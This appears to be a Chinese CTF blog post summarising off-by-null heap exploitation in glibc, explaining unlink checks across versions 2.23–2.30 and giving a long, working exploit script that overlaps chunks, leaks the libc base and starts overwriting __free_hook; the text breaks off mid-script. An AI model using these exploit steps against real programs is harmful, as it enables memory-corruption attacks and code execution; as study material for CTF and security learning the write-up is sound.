[{"title":"off-by-null总结","url":"/2021/08/31/off-by-null总结/","content":"\n\n\n# 前言\n\noff-by-null是堆中的常见漏洞，很多时候都是结合堆布局来进行利用的。这里结合原理解析、不同版本和条件的off-by-null以及常见的漏洞条件做个总结。\n\n# 一、原理解析\n\n主要发生在`_int_free`的unlink中：\n\n```c\n//2.23 when size>global_max_fast\n\n/* consolidate backward */\nif (!prev_inuse(p)) {\n    prevsize = p->prev_size;\n    size += prevsize;\n    p = chunk_at_offset(p, -((long) prevsize));\n    unlink(av, p, bck, fwd);\n}\n\n\nif (nextchunk != av->top) {\n    /* get and clear inuse bit */\n    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);\n\n    /* consolidate forward */\n    if (!nextinuse) {\n        unlink(av, nextchunk, bck, fwd);\n        size += nextsize;\n    }\n    \n\n    \n/* Take a chunk off a bin list */\n#define unlink(AV, P, BK, FD) {                                             \n    FD = P->fd;\t\t\t\t\t\t\t\t       \n    BK = P->bk;\t\t\t\t\t\t\t\t       \n    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))\t\t       \n        malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);   \n    else {\t\t\t\t\t\t\t\t       \n        FD->bk = BK;\t\t\t\t\t\t\t       \n        BK->fd = FD;\t\t\t\t\t\t\t       \n        if (!in_smallbin_range (P->size)\t\t\t\t       \n            && __builtin_expect (P->fd_nextsize != NULL, 0)) \n        {\t\t       \n            if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)\t       \n                || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))     \n                malloc_printerr (check_action,\t\t\t\t       \n                                 \"corrupted double-linked list (not small)\",     \n                                 P, AV);\t\t\t\t\t       \n            if (FD->fd_nextsize == NULL) {\t\t\t\t       \n                if (P->fd_nextsize == P)\t\t\t\t       \n                    FD->fd_nextsize = FD->bk_nextsize = FD;\t\t       \n                else {\t\t\t\t\t\t\t       \n                    FD->fd_nextsize = P->fd_nextsize;\t\t\t       \n                    FD->bk_nextsize = P->bk_nextsize;\t\t\t       \n                    P->fd_nextsize->bk_nextsize = FD;\t\t\t       \n                    P->bk_nextsize->fd_nextsize = FD;\t\t\t       \n                }\t\t\t\t\t\t\t       \n            } else {\t\t\t\t\t\t\t       \n                P->fd_nextsize->bk_nextsize = P->bk_nextsize;\t\t       \n                P->bk_nextsize->fd_nextsize = P->fd_nextsize;\t\t       \n            }\t\t\t\t\t\t\t\t       \n        }\t\t\t\t\t\t\t\t       \n    }\n}    \n```\n\n为了方便，依据物理地址相邻来命名如下：\n\n![Snipaste_2021-08-31_11-47-47](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831114803.png)\n\n即当size大于global_max_fast且不是mmap出来的chunk时，就会进入判断。所以这里我们进行释放用的chunk的大小就必须要大于global_max_fast才行，否则就是改掉了pre_inuse位也是直接进入fastbin，不会进入判断的。\n\n+ 先依据当前chunk(chunkP)的pre_inuse位来判断前一个chunk(preChunk)是否处于释放状态，是则进入unlink，将前一个chunk取出\n\n+ 然后判断下一个chunk(nextChunk)是否是top_chunk，是则直接与top_chunk合并。\n+ 若nextChunk不为top_chunk，再判断下一个Chunk的再下一个chunk的pre_inuse位来判断nextChunk是否处于释放状态，若是则进入unlink。\n\n然后unlink中就不细说，就是双向循环链表解链的过程，依据fd和bk来查找并解链，但是我们的off-by-null通常不会涉及到nextsize位的使用，所以基本不用看后面的。需要注意的是，由于这里会检查，即：\n\n    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))\t\t       \n        malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\n\n所以我们需要将进入unlink的chunk的fd和bk来进行伪造或者干脆直接释放使其直接进入unsortedbin中完成双向链表的加持。这里先讲放入unsortedbin中来获取fd和bk的方法，伪造的方法一般用在2.29及以上的高版本中，因为那时候的unlink加入了关于size位的检查，不能简单得伪造fd和bk。\n\n其次，这里还需要明白一个寻找chunk的原理。\n\n+ 寻找preChunk：preChunk_addr = chunkP_addr - chunkP->pre_size\n+ 寻找nextChunk：nextChunk_addr = chunkP_addr + chunkP->size\n\n即以下源码，这个一直没有变化过：\n\n```c\n/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */\n#define prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))\n\n/* Ptr to next physical malloc_chunk. */\n#define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))\n\n/* Get size, ignoring use bits */\n#define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS))\n\n/* extract p's inuse bit */\n#define inuse(p)\t\t\t\t\t\t\t      \\\n  ((((mchunkptr) (((char *) (p)) + chunksize (p)))->mchunk_size) & PREV_INUSE)\n```\n\n所以，如果我们可以伪造pre_size和in_use位，就能触发向上任意寻找一个满足fd和bk为双向链表的chunk，从而将中间所有的chunk都一并合并为一个Chunk释放掉。(向下合并也可以的，不过一般不常使用)\n\n![Snipaste_2021-08-31_11-57-00](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831115708.png)\n\n这里就是通过释放chunkP，依据pre_size向上寻找到原本已经在unsortedbin中的preChunk，其FD和BK已经组成双向循环链表，可以绕过检查，所以释放ChunkP之后preChunk+OverlapChunk+chunkP都进入到unsortedbin中。但是OverlapChunk本身其实并没有被释放，我们再从unsortedbin中申请切割出preChunk大小的chunk，再申请就可以得到OverlapChunk。这样我们就有两个指针都指向OverlapChunk，从而伪造出UAF，之后我们就可以通过OverlapChunk来getshell了。\n\n## 1.常用布局\n\n```python\nadd_malloc(0xf8,'\\x00'*0xf8)\t#0x1\nadd_malloc(0x68,'\\x00'*0x68)\t#0x2\nadd_malloc(0xf8,'\\x00'*0xf8)\t#0x3\nadd_malloc(0x68,'\\x00'*0x68)\t#0x4\nfree(0x1)\nedit(0x2,0x70,'\\x00'*0x60+p64(0x70+0x100)+p16(0x100))\nfree(0x3)\n```\n\noff-by-null在调试中不太好搞，所以我就借用堆溢出来假设存在off-by-null，将chunk3原本的size位0x101通过off-by-null变成0x100即可。\n\n\n\n## 2.注意事项\n\n### (1)顺序\n\n此外需要注意的是，需要先释放chunk1，再溢出修改chunk3。不然如果先修改chunk3，那么释放chunk1的时候，寻找chunk1的nextChunk即chunk2，判断chunk2是否处于释放状态时，会找到chunk3，依据pre_inuse位发现chunk2已经处于释放状态，那么尝试进入unlink合并，但是这里的chunk2的fd和bk并没有组成双向循环链表，所以会出错。\n\n### (2)size位的设置\n\n+ 0x100：这里注意到上面的布局中size位为0x100和0x70，这里的0x100就是为了通过off-by-null将0x101变成0x100设置的。当然设置为0x201，0x301通常也是一样的。\n\n+ 0x70：这里就通常是为了方便打fastbin attack，从_malloc_hook处构造0x7f字节错位用的。\n\n\n\n# 二、更新换代\n\n## 1.Glibc2.27\n\n这里也不是特指2.27，而指的是Glibc2.29以下的存在tcache的版本，这类版本通常需要填充满tcache再进行释放，也不需要多讲。\n\n## 2.Glibc2.29\n\n从这个版本开始，off-by-null由于加入的检查，引入了好几种全新的利用方式。\n\n### (1)_int_free中的变化\n\n```c\nif (!prev_inuse(p)) {\n    prevsize = prev_size (p);\n    size += prevsize;\n    p = chunk_at_offset(p, -((long) prevsize));\n    if (__glibc_unlikely (chunksize(p) != prevsize))\n        malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n    unlink_chunk (av, p);\n}\n```\n\n加入的检查是\n\n```c\nif (__glibc_unlikely (chunksize(p) != prevsize))\n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n```\n\n这里的p因为`p = chunk_at_offset(p, -((long) prevsize));`已经变成了preChunk。所以这里就是检查preChunk->size是否等于chunkP->pre_size。按照上面那张图的逻辑，preChunk的size为0x101，chunkP的pre_size为0x170，两个不等于，根本就无法进入unlink中，直接崩掉。\n\n![Snipaste_2021-08-31_11-57-00](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831123554.png)\n\n### (2)unlink变化\n\n首先unlink从宏定义变成了全局函数定义，名字也从unlink变成了unlink_chunk，但实际内容没有变太多，只是加入了一些检查：\n\n```c\n/* Take a chunk off a bin list.  */\nstatic void\n    unlink_chunk (mstate av, mchunkptr p)\n{\n    if (chunksize (p) != prev_size (next_chunk (p)))\n        malloc_printerr (\"corrupted size vs. prev_size\");\n\n    mchunkptr fd = p->fd;\n    mchunkptr bk = p->bk;\n\n    if (__builtin_expect (fd->bk != p || bk->fd != p, 0))\n        malloc_printerr (\"corrupted double-linked list\");\n\n    fd->bk = bk;\n    bk->fd = fd;\n    if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)\n    {\n        if (p->fd_nextsize->bk_nextsize != p\n            || p->bk_nextsize->fd_nextsize != p)\n            malloc_printerr (\"corrupted double-linked list (not small)\");\n\n        if (fd->fd_nextsize == NULL)\n        {\n            if (p->fd_nextsize == p)\n                fd->fd_nextsize = fd->bk_nextsize = fd;\n            else\n            {\n                fd->fd_nextsize = p->fd_nextsize;\n                fd->bk_nextsize = p->bk_nextsize;\n                p->fd_nextsize->bk_nextsize = fd;\n                p->bk_nextsize->fd_nextsize = fd;\n            }\n        }\n        else\n        {\n            p->fd_nextsize->bk_nextsize = p->bk_nextsize;\n            p->bk_nextsize->fd_nextsize = p->fd_nextsize;\n        }\n    }\n\n}\n```\n\n加入的检查，就加了一个if语句：\n\n```c\n  if (chunksize (p) != prev_size (next_chunk (p)))\n    malloc_printerr (\"corrupted size vs. prev_size\");\n```\n\n即在unlink时会检查nextChunk的pre_size是否等于chunkP的size。\n\n按照之前那张图的逻辑，进入unlink中时preChunk的size为0x100，preChunk的nextChunk，即overlapChunk的pre_size为0x100，相等，可以满足要求，没啥大用，但是之后提出的绕过手段也是需要绕过这个检查的。\n\n![Snipaste_2021-08-31_11-57-00](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831122206.png)\n\n▲后面的更高版本，到2.33都没变化，也就不提了。只是2.32中的指针异或可能需要注意一下，但是之后的绕过手段一般是基于unsortedbin，smallbin，largebin来绕过，不存在指针异或的情况，所以也不用太在意。\n\n# 三、高版本花式绕过\n\n这里将的是2.29及以上的版本\n\n## 第一种\n\n这个之前写过，参考这篇文章：\n\n[2.29下的off-by-null | PIG-007](https://www.pig-007.top/2021/08/14/2.29下的off-by-null/)\n\n或者t1an5g师傅的文章：\n\nhttps://bbs.pediy.com/thread-257901.htm#msg_header_h2_2\n\n当然ex师傅的原始解析也很好：\n\nhttp://blog.eonew.cn/archives/1233\n\n但是这个需要爆破半个字节，也不能对size做太多的限制，且chunk需要申请大概有24个，所以看个人需要。\n\n## 第二种\n\n这个也写过，参考这篇：\n\n[2.29-2.32下的off-by-null | PIG-007](https://www.pig-007.top/2021/08/14/2.29-2.32下的off-by-null/)\n\n当然我也是参考WJH师傅的：\n\n[glibc 2.29-2.32 off by null bypass - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/236078)\n\n这个不需要爆破，但是对size的限制不能太严格，需要largebin的size。\n\n## 第三种\n\n这个还没写过总结，现在来，不过先贴下文章，init-0师傅的：\n\n[堆漏洞利用（2.29以上glibc,off-by-null, 加了申请size限制） - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/231418#h3-8)\n\n这种方法在size限制下也可以使用，文章中的限制是0xe8的堆块，真是将堆布局用到极高的水平。\n\n▲先看最终的布局效果：\n\n![Snipaste_2021-08-31_18-42-42](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831184255.png)\n\n这样就能通过两项检查了：\n\n```c\n//_int_free中\nif (__glibc_unlikely (chunksize(p) != prevsize))\n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n\n//unlink中\nif (chunksize (p) != prev_size (next_chunk (p)))\n    malloc_printerr (\"corrupted size vs. prev_size\");\n```\n\n\n\n### (1)前置布局：\n\n由于init-0师傅的题目中，申请chunk是从0x3a0开始的，所以这里我就也以0x3a0开始：\n\n```python\n#get layout to let chunk0_addr = 0x****3a0\nclaim(0x88)# 0-6\t\t\t#1-7\nclaim(0x98)# 7-13\t\t\t#8-14\nclaim(0xa8)# 14-20\t\t\t#15-21\nclaim(0xb8)# 21-27\t\t\t#22-28\nclaim(0xc8)# 28-34\t\t\t#29-35\nclaim(0xd8)# 35-41\t\t\t#36-42\nclaim(0xe8)# 42-48\t\t\t#43-49\n\n#--------------------------\nadd_malloc(0x98,'\\x00')# 49 \t\t\t\t#50\nadd_malloc(0x98,'\\x00')# 50 \t\t\t\t#51\t\t0x****f900\nadd_malloc(0x18,'\\x00')# 51  \t\t\t\t#52 \t0x****f9a0\nadd_malloc(0xa8,'\\x00')# 52     0 \t\t\t#53\t\t0x****f9c0\nadd_malloc(0xb8,'\\x00')# 53     1 \t\t\t#54\t\t0x****fa70\nadd_malloc(0xd8,'\\x00')# 54     2 \t\t\t#55\t\t0x****fb30\nadd_malloc(0xd8,'\\x00')# 55     \t\t\t#56\t\t\nadd_malloc(0xe8,'\\x00')# 56     3 \t\t\t#57\t\t0x****fcf0\n\n#这个0x200和0xe0的设置是为了之后将unsortedbinChunk给改成0x200备用的\nfakeChunk_nextChunk_preSize = p64(0x200) + p64(0xe0)\nedit(57,0x10,fakeChunk_nextChunk_preSize)# 56\t\t\t#57\n\nadd_malloc(0xe8,'\\x00')# 57    4 \t\t\t#58 \t0x****fde0\nadd_malloc(0x98,'\\x00')# 58 \t\t\t\t#59\nadd_malloc(0xe8,'\\x00')# 59 \t\t\t\t#60 \t0x****ff70\nadd_malloc(0x18,'\\x00')# 60 \t\t\t\t#61\n```\n\n### (2)填充tcache\n\n并且将要利用的Chunk释放合并进入unsortedbin\n\n```python\n#free 0~48 \t\t#1~49\n#-------------------------\n#--tcache\nfor i in range(0,7):  #0x88  \t\n    free(i+1)\nfor i in range(14,21):#0xa8\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\nfor i in range(35,42):#0xd8\n    free(i+1)\nfor i in range(42,49):#0xe8\n    free(i+1)    \n#--tcache\n\nfor i in range(52,57): #52~56  \t\t\t\t#53~57  merge into unsortedbin\n    free(i+1)\n```\n\n![Snipaste_2021-08-31_19-41-25](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831194137.png)\n\n```mermaid\ngraph TD;\n    0(chunk53<br>0xa8<br>0x****9c0)-->1(chunk54<br>0xb8)-->2(chunk55<br>0xd8)-->3(chunk56<br>0xd8)-->4(chunk57<br>0xe8<br>0x****cf0)\n```\n\n### (3)重构53~57结构为97~101\n\n```python\n#---------------------------\n# empty tcache\nclaim(0x88) #62~68\nclaim(0xa8) #69~75\nclaim(0xb8) #76~82\nclaim(0xd8) #83~89\nclaim(0xe8) #90~96\n#---------------------------\n\n#---------------------------------------------------------------- 上面是一个大的unsorted bin\n#进行add之后carver up and unsortedbin 被放入了largebin 之后进行了分配\nadd_malloc(0x98,'\\x00')# 52 \t#97  \t#0x****9c0\nadd_malloc(0x98,'\\x00')# 53     #98\t\t#0x****A60\n\nfake_chunk_size = 0x98 * \"a\" + p16(0x200)\n#这里我借用堆溢出来仿照off-by-null，修改还在largebin中的chunk的size从0x2e1->0x200\n#changing largebinChunk_size will not cause abort\nedit(98,0x98+0x2,fake_chunk_size)#53 #98\nadd_malloc(0x88,'\\x00')#54 \t#99 \t#0x****B00\nadd_malloc(0x88,'\\x00')#55  #100 \t#0x****B90\nadd_malloc(0xd8,'\\x00')#56  #101 \t#0x****C70\n```\n\n重构之后如下\n\n```mermaid\ngraph TD;\n    0(chunk97<br>0x98<br>0x****9c0)-->1(chunk98<br>0x98)-->2(chunk99<br>0x88)-->3(chunk100<br>0x88)-->4(chunk101<br>0xd8<br>0x****cf0)-->5(0xe0碎片)\n```\n\n那么实际上其实原先的0x420被申请了0x340，还有一部分0xe0没有被申请出来。\n\n![Snipaste_2021-08-31_20-07-33](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831200742.png)\n\n### (4)构造preChunk的fd和bk\n\n```python\n#------tcache\nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(0,7):#0x88\n    free(i+1)\nfor i in range(42,49):#0xe8\n    free(i+1)        \n#------tcache\n\n\nfree(51)#0x98 \t#50  \t#51 #0x****f900\n#let 99->fd = chunk51_addr(0x****f900)\nfree(99)#0x88  \t#54 \t#99\n#let 99->bk = chunk60_addr(0x****ff70)\nfree(60)#0xe8 \t#59 \t#60 #0x****ff70\n```\n\n\n\n![Snipaste_2021-08-31_20-40-24](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831204034.png)\n\n### (5)再重构97~101为97->124->132->134\n\n```python\nfree(98)#0x98 \t#53 \t#98\n\n#---------------add back\nclaim(0x88) #102~108\nclaim(0x98) #109~115\nclaim(0xe8) #116~122\n#---------------add back\n\n#将51,99,98分别放入对应的smallbin,98和99由于物理相邻，所以合并成为0x130的块\n#之后依据大小适配原则将60分配回来给123\nadd_malloc(0xd8,'\\x00')# 0x32\t\t#123 0x****ff70,实际大小为0xf0\n#将0x131的smallbin切分，此时51还在0xa0的smallbin中，剩下0x70的Chunk进入unsortedbin中\nadd_malloc(0xb8,'\\x00')# 0x35  \t\t#124 0x****fa60\n\nfor i in range(0,7):#0x88\n    free(i+1)\n#chunk100放入unsortedbin, 与0x70的碎片合并，形成0x101的块\nfree(100) \t\t\t#55 \t#100\n\nclaim(0x88)\t#125~131\n\n#切割0x101的块，获得0xb8大小的0x****fb20，方便与0x****f900的块放入同一个unsortebin中\nadd_malloc(0xb8,'\\x00')#0x36 \t#132 \t0x****fb20\nadd_malloc(0x98,'\\x00')#0x37  \t#133\t0x****f900\nadd_malloc(0x38,'\\x00')#0x3b \t#134 \t0x****fbe0\n```\n\n重构之后如下\n\n```mermaid\ngraph TD;\n    0(chunk97<br>0x98<br>0x****f9c0)-->1(chunk124<br>0xb8<br>chunk99被包含<br>0x****fa60)-->2(chunk132<br>0xb8<br>0x****fb20)-->3(chunk134<br>0x38<br>0x****fbe0)-->4(0xe0碎片)\n```\n\n### (6)修复FD->bk和BK->fd\n\n```python\n#------tcache\nfor i in range(42,49):#0xe8\n    free(i+1)        \nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\n#------tcache\n\n#let 133->bk = chunk132_addr(0x****f900->bk = 0x****fb20)\nfree(133) #0x37 \t#133 \t0x****f900\nfree(132) #0x36  \t#132 \t0x****fb20\n#let 123->fd = chunk132_addr(0x****ff70->bk = 0x****fb20)\nfree(123) #0x32 \t#123  \t0x****ff70\n```\n\n### (7)再重构为97->124->157->134 \n\n方便将`0x****ff70`和`0x****f900`的对于fd,bk进行off-by-null，使得0xb20变为0xb00。\n\n```python\nfree(59)  #58\t\t#59\t\t0x****fed0\n#chunk59和chunk123合并进入unsortedbin，大小0x190(0xf0+0xa0)\n\nclaim(0x98) \t#135~141\nclaim(0xb8)\t\t#142~148\nclaim(0xe8) \t#149~155\n\nadd_malloc(0xc8,'\\x00')\t\t#0x32 \t\t#156 \t0x****fed0\t\nadd_malloc(0xb8,'\\x00')\t\t#0x36 \t\t#157 \t0x****fb20\nadd_malloc(0xb8,'\\x00')\t\t#0x37  \t\t#158\t0x****ffa0\nadd_malloc(0x98,'\\x00')\t\t#58  \t\t#159 \t0x****f900\n\n#--top_chunk\nadd_malloc(0x98,'\\x00')        #0x3d \t\t\t#160\nadd_malloc(0x98,'\\x00')        #0x3e \t\t\t#161\nadd_malloc(0x18,'\\x00')        #0x3f \t\t\t#162\n\n#------tcache\nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\n#------tcache\n\n\nfree(161) #0x98 \t#0x3e \t\t#161\nfree(159) #0x98 \t#58  \t\t#159 \t0x****f900\nfree(157) #0xb8 \t#0x36 \t\t#157\nfree(50)  #0x98 \t#49 \t\t#50 \t0x****f860\n#其中159和50合并为0x140大小的块放入unsortedbin中\n#unsortedbin:0x****f860 —▸ 0x****fb20 —▸ 0x****0120\n\nclaim(0xb8) #163~169\nclaim(0x98) #170~176\n#----------------------------------------------------\nadd_malloc(0xb8,'\\x00') #49 \t#177\nadd_malloc(0x98,'\\x00') #0x36  \t#178\n\n#切割0x140的块\nadd_malloc(0xc8,'\\x00')#0x3a \t#179 \t0x****f860\nadd_malloc(0x68,'\\x00')#0x3e   \t#180 \t\n```\n\n现在就可以通过chunk179来将`0x****f900`中的bk给改掉。\n\n通过chunk156来将`0x****ff70`中的fd给改掉。\n\n### (8)利用off-by-null得到最终布局\n\n```python\npartial_null_write = 0x98*'b'\npartial_null_write += p64(0xf1)\nedit(156,0x98+0x8+0x1,partial_null_write+'\\x00') #0x32  \t#156\n\npartial_null_write = 0xa8*'c'\nedit(179,0xa8+0x1,partial_null_write + '\\x00') \t\t#0x3a \t\t#179\n\n#伪造pre_size\nfake_chunk_size = 0x98*'d'\nfake_chunk_size += p64(0x2e1)\nedit(124,0x98+0x8,fake_chunk_size) \t#0x35 \t#124\n```\n\n### (9)触发off-by-null\n\n```python\nfor i in range(42,49):#0xe8\n    free(i+1)    \nfree(58)\n```\n\n### ▲总结\n\n①利用unsortedbin成链机制，合并unsortedbin中的chunk并且切割，这样就能保留住FD和BK了。\n\n②再利用unsortedbin成链和切割的机制，就能修改到对应preChunk的FD和BK了，修改最后一个字节为\\x00即可。\n\n③由于2.29之后的添加的两项检查，所以需要注意的是伪造unsortedbinChunk的size时，也要伪造nextChunk的pre_size和pre_inuse位。\n\n④太他丫的麻烦了，有这时间布局还不如肝其他题.....\n\n再贴个汇总的exp，基于libc2.30，自己的题目：\n\n```python\n#有size限制，对应索引往后移即可\nadd_malloc(0x1000-0x290+0x3000-0x8+0x3a0,'PIG007NB')\n\n\t\t\t#old \t\t\t#new\n#get layout to let chunk0_addr = 0x****3a0\nclaim(0x88)# 0-6\t\t\t#1-7\nclaim(0x98)# 7-13\t\t\t#8-14\nclaim(0xa8)# 14-20\t\t\t#15-21\nclaim(0xb8)# 21-27\t\t\t#22-28\nclaim(0xc8)# 28-34\t\t\t#29-35\nclaim(0xd8)# 35-41\t\t\t#36-42\nclaim(0xe8)# 42-48\t\t\t#43-49\n\n#--------------------------\nadd_malloc(0x98,'\\x00')# 49 \t\t\t\t#50\nadd_malloc(0x98,'\\x00')# 50 \t\t\t\t#51\t\t0x****f900\nadd_malloc(0x18,'\\x00')# 51  \t\t\t\t#52 \t0x****f9a0\nadd_malloc(0xa8,'\\x00')# 52     0 \t\t\t#53\t\t0x****f9c0\nadd_malloc(0xb8,'\\x00')# 53     1 \t\t\t#54\t\t0x****fa70\nadd_malloc(0xd8,'\\x00')# 54     2 \t\t\t#55\t\t0x****fb30\nadd_malloc(0xd8,'\\x00')# 55     \t\t\t#56\t\t\nadd_malloc(0xe8,'\\x00')# 56     3 \t\t\t#57\t\t0x****fcf0\n\n#这个0x200和0xe0的设置是为了之后将unsortedbinChunk给改成0x200备用的\nfakeChunk_nextChunk_preSize = p64(0x200) + p64(0xe0)\nedit(57,0x10,fakeChunk_nextChunk_preSize)# 56\t\t\t#57\n\nadd_malloc(0xe8,'\\x00')# 57    4 \t\t\t#58 \t0x****fde0\nadd_malloc(0x98,'\\x00')# 58 \t\t\t\t#59\nadd_malloc(0xe8,'\\x00')# 59 \t\t\t\t#60 \t0x****ff70\nadd_malloc(0x18,'\\x00')# 60 \t\t\t\t#61\n\n#free 0~48 \t\t#1~49\n#-------------------------\n#--tcache\nfor i in range(0,7):  #0x88  \t\n    free(i+1)\nfor i in range(14,21):#0xa8\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\nfor i in range(35,42):#0xd8\n    free(i+1)\nfor i in range(42,49):#0xe8\n    free(i+1)    \n#--tcache\n\nfor i in range(52,57): #52~56  \t\t\t\t#53~57  merge into unsortedbin\n    free(i+1)\n\n#---------------------------\n# empty tcache\nclaim(0x88) #62~68\nclaim(0xa8) #69~75\nclaim(0xb8) #76~82\nclaim(0xd8) #83~89\nclaim(0xe8) #90~96\n#---------------------------\n\n#---------------------------------------------------------------- 上面是一个大的unsorted bin\n#进行add之后carver up and unsortedbin 被放入了largebin 之后进行了分配\nadd_malloc(0x98,'\\x00')# 52 \t#97  \t#0x****9c0\nadd_malloc(0x98,'\\x00')# 53     #98\t\t#0x****A60\n\nfake_chunk_size = 0x98 * \"a\" + p16(0x200)\n#这里我借用堆溢出来仿照off-by-null，修改还在largebin中的chunk的size从0x2e1->0x200\n#changing largebinChunk_size will not cause abort\nedit(98,0x98+0x2,fake_chunk_size)#53 #98\nadd_malloc(0x88,'\\x00')#54 \t#99 \t#0x****B00\nadd_malloc(0x88,'\\x00')#55  #100 \t#0x****B90\nadd_malloc(0xd8,'\\x00')#56  #101 \t#0x****C70\n\n\n#构造preChunk的fd和bk------------------------\n#------tcache\nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(0,7):#0x88\n    free(i+1)\nfor i in range(42,49):#0xe8\n    free(i+1)        \n#------tcache\n\n\nfree(51)#0x98 \t#50  \t#51 #0x****f900\n#let 99->fd = chunk51_addr(0x****f900)\nfree(99)#0x88  \t#54 \t#99\n#let 99->bk = chunk60_addr(0x****ff70)\nfree(60)#0xe8 \t#59 \t#60 #0x****ff70\n#构造preChunk的fd和bk------------------------\n\n\nfree(98)#0x98 \t#53 \t#98\n\n#---------------add back\nclaim(0x88) #102~108\nclaim(0x98) #109~115\nclaim(0xe8) #116~122\n#---------------add back\n\n#将51,99,98分别放入对应的smallbin,98和99由于物理相邻，所以合并成为0x130的块\n#之后依据大小适配原则将60分配回来给123\nadd_malloc(0xd8,'\\x00')# 0x32\t\t#123 0x****ff70,实际大小为0xf0\n#将0x131的smallbin切分，此时51还在0xa0的smallbin中，剩下0x70的Chunk进入unsortedbin中\nadd_malloc(0xb8,'\\x00')# 0x35  \t\t#124 0x****fa60\n\nfor i in range(0,7):#0x88\n    free(i+1)\n#chunk100放入unsortedbin, 与0x70的碎片合并，形成0x101的块\nfree(100) \t\t\t#55 \t#100\n\nclaim(0x88)\t#125~131\n\n#切割0x101的块，获得0xb8大小的0x****fb20，方便与0x****f900的块放入同一个unsortebin中\nadd_malloc(0xb8,'\\x00')#0x36 \t#132 \t0x****fb20\nadd_malloc(0x98,'\\x00')#0x37  \t#133\t0x****f900\nadd_malloc(0x38,'\\x00')#0x3b \t#134 \t0x****fbe0\n\n\n#修复FD->bk和BK->fd-----------------------------\n#------tcache\nfor i in range(42,49):#0xe8\n    free(i+1)        \nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\n#------tcache\n\n#let 133->bk = chunk132_addr(0x****f900->bk = 0x****fb20)\nfree(133) #0x37 \t#133 \t0x****f900\nfree(132) #0x36  \t#132 \t0x****fb20\n#let 123->fd = chunk132_addr(0x****ff70->bk = 0x****fb20)\nfree(123) #0x32 \t#123  \t0x****ff70\n#修复FD->bk和BK->fd-----------------------------\n\n\nfree(59)  #58\t\t#59\t\t0x****fed0\n#chunk59和chunk123合并进入unsortedbin，大小0x190(0xf0+0xa0)\n\nclaim(0x98) \t#135~141\nclaim(0xb8)\t\t#142~148\nclaim(0xe8) \t#149~155\n\nadd_malloc(0xc8,'\\x00')\t\t#0x32 \t\t#156 \t0x****fed0\t\nadd_malloc(0xb8,'\\x00')\t\t#0x36 \t\t#157 \t0x****fb20\nadd_malloc(0xb8,'\\x00')\t\t#0x37  \t\t#158\t0x****ffa0\nadd_malloc(0x98,'\\x00')\t\t#58  \t\t#159 \t0x****f900\n\n#--top_chunk\nadd_malloc(0x98,'\\x00')        #0x3d \t\t\t#160\nadd_malloc(0x98,'\\x00')        #0x3e \t\t\t#161\nadd_malloc(0x18,'\\x00')        #0x3f \t\t\t#162\n\n#------tcache\nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\n#------tcache\n\n\nfree(161) #0x98 \t#0x3e \t\t#161\nfree(159) #0x98 \t#58  \t\t#159 \t0x****f900\nfree(157) #0xb8 \t#0x36 \t\t#157\nfree(50)  #0x98 \t#49 \t\t#50 \t0x****f860\n#其中159和50合并为0x140大小的块放入unsortedbin中\n#unsortedbin:0x****f860 —▸ 0x****fb20 —▸ 0x****0120\n\nclaim(0xb8) #163~169\nclaim(0x98) #170~176\n#----------------------------------------------------\nadd_malloc(0xb8,'\\x00') #49 \t#177\nadd_malloc(0x98,'\\x00') #0x36  \t#178\n\n#切割0x140的块\nadd_malloc(0xc8,'\\x00')#0x3a \t#179 \t0x****f860\nadd_malloc(0x68,'\\x00')#0x3e   \t#180 \t\n\n\npartial_null_write = 0x98*'b'\npartial_null_write += p64(0xf1)\nedit(156,0x98+0x8+0x1,partial_null_write+'\\x00') #0x32  \t#156\n\npartial_null_write = 0xa8*'c'\nedit(179,0xa8+0x1,partial_null_write + '\\x00') \t\t#0x3a \t\t#179\n\n#伪造pre_size\nfake_chunk_size = 0x98*'d'\nfake_chunk_size += p64(0x2e1)\nedit(124,0x98+0x8,fake_chunk_size) \t#0x35 \t#124\n\n\nfor i in range(42,49):#0xe8\n    free(i+1)    \nfree(58)\n\n\n#pull-down the unsortedbinChunk to chunk134 and leak main_arena\nedit(134,0x8,\"e\"*8)  #0x3b #134\nadd_malloc(0xd8,'\\x00') \t#181\nshow(134)\n\nlibc_base = u64Leakbase(unsortedBinIdx + libc.sym['__malloc_hook'] + 0x10)\nlg('libc_base',libc_base)\n\n\n#---------------------------------------------------------------------------------\nclaim(0xe8) \t#182~188\nadd_malloc(0xe8,'\\x00')\t\t#0x40 \t#189\nfree(44) \t#0x2b \t#44\nfree(134) \t#0x3b \t#134\nedit(189,0x8,p64(libc_base+libc.sym['__free_hook']-8)) \t#0x40 \t#189\nadd_malloc(0xe8,'\\x00')  